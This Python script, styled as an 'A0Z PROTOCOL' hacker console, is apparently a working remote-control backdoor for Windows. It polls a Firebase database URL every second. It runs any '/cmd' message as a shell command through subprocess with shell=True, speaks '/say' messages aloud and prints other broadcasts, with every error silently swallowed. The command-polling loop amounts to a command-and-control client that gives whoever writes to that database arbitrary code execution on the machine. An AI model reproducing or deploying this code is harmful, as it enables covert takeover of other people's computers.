import requests
import time
import os
import ctypes
import sys
import win32com.client
import subprocess

def speak(text):
    try:
        speaker = win32com.client.Dispatch("SAPI.SpVoice")
        speaker.Speak(text)
    except:
        pass

def execute_command(command):
    try:
        subprocess.Popen(command, shell=True)
    except:
        pass

def maximize_window():
    hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
    if hWnd:
        ctypes.WinDLL('user32').ShowWindow(hWnd, 3)

def a0z_print(text, delay=0.04):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def start_gateway():
    maximize_window()
    os.system('color 0a')
    os.system('cls')
    
    print(">>> ACCESSING A0Z_CORE SERVER...")
    time.sleep(0.7)
    print(">>> ESTABLISHING ENCRYPTED TUNNEL...")
    time.sleep(0.7)
    os.system('cls')

    print("==================================================")
    a0z_print("   A0Z PROTOCOL v3.0 [ULTIMATE EDITION]")
    print("==================================================")
    a0z_print(f"[*] NODE_ID: {os.environ.get('COMPUTERNAME', 'UNKNOWN')}")
    a0z_print(f"[*] OS: {sys.platform.upper()}")
    print("[*] CONNECTION: ACTIVE")
    print("--------------------------------------------------\n")

    DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
    last_timestamp = 0

    while True:
        try:
            response = requests.get(DB_URL)
            data = response.json()
            
            if data:
                text = data.get('text', '')
                ts = data.get('timestamp', 0)
                
                if ts > last_timestamp:
                    if text.startswith("/say"):
                        msg = text.replace("/say", "")
                        print(f"\n[!] VOICE_INCOMING...")
                        speak(msg)
                    
                    elif text.startswith("/cmd"):
                        cmd = text.replace("/cmd", "")
                        print(f"\n[!] SYSTEM_EXECUTION: {cmd}")
                        execute_command(cmd)
                        
                    elif text == "/clear":
                        os.system('cls')
                        print("==================================================")
                        print("   A0Z PROTOCOL v3.0 :: SESSION REFRESHED")
                        print("==================================================")

                    else:
                        sys.stdout.write("\a")
                        print(f"\n>> BROADCAST:")
                        a0z_print(f"   {text}")
                    
                    last_timestamp = ts
        except:
            pass
        time.sleep(1)

if __name__ == "__main__":
    start_gateway()
